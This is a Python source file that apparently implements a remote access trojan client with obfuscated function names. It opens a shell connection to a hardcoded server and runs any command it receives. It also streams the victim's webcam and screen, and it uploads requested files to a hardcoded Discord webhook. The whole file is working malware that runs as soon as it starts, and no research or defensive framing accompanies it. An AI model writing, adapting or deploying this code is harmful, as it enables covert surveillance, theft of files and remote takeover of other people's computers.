import socket
import subprocess
import cv2
import struct
import time
import requests
import os
import pyautogui
import numpy as np

def a1():
    server_ip = "10.0.1.33"
    server_port = 9999
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.connect((server_ip, server_port))
    return c

def b2(c):
    cap = cv2.VideoCapture(0)
    
    while True:
        ret, frame = cap.read()
        if not ret:
            break

        _, encoded = cv2.imencode('.jpg', frame)
        c.sendall(struct.pack(">L", len(encoded)) + encoded.tobytes())

    cap.release()

def c3(c):
    while True:
        screenshot = pyautogui.screenshot()
        _, encoded = cv2.imencode('.jpg', cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR))
        c.sendall(struct.pack(">L", len(encoded)) + encoded.tobytes())

def d4(command, c):
    output = subprocess.getoutput(command)
    c.send(output.encode())

def e5():
    c = a1()
    while True:
        try:
            command = c.recv(1024).decode().strip()

            if command.startswith("!"):
                if command.startswith("!download"):
                    filename = command.split(" ", 1)[1]
                    if os.path.exists(filename):
                        with open(filename, "rb") as f:
                            requests.post("https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2", files={"file": f})

                elif command.startswith("!webcam_stream"):
                    b2(c)

                elif command.startswith("!screen_stream"):
                    c3(c)

                elif command.startswith("CTRL+P"):
                    print("[ * ] Stopping stream...")
                    break
            else:
                d4(command, c)

        except Exception as e:
            print(f"[ - ] Error: {e}")
            break

e5()
